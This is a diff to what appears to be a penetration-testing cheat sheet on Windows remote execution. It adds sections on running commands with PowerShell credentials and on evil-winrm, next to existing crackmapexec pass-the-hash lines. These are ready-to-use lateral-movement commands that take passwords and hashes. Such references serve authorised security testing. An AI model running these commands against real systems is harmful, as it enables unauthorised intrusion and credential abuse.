@@ -9,6 +9,8 @@
 * [Metasploit](#metasploit)
     * [Metasploit - SMB](#metasploit-smb)
     * [Metasploit - Psexec](#metasploit-psexec)
+* [Remote Code Execution with PS Credentials](#remote-code-execution-with-ps-credentials)
+* [WinRM](#winrm)
 * [Crackmapexec](#crackmapexec)
 * [Winexe](#winexe)
 * [WMI](#wmi)
@@ -97,6 +99,22 @@ python crackmapexec.py 10.9.122.0/25 -d DOMAIN -u username -p password
 python crackmapexec.py 10.10.10.10 -d DOMAIN -u username -p password -x whoami
 # pass the hash
 cme smb 172.16.157.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:5509de4ff0a6eed7048d9f4a61100e51' --local-auth
+```
+
+## Remote Code Execution with PS Credentials
+
+```powershell
+$SecPassword = ConvertTo-SecureString 'secretpassword' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\USERNAME', $SecPassword)
+Invoke-Command -ComputerName DC01 -Credential $Cred -ScriptBlock {whoami}
+```
+
+## WinRM
+
+```powershell
+root@payload$ git clone https://github.com/Hackplayers/evil-winrm
+root@payload$ evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]
+root@payload$ evil-winrm.rb -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
 ```
 
 ## Winexe 
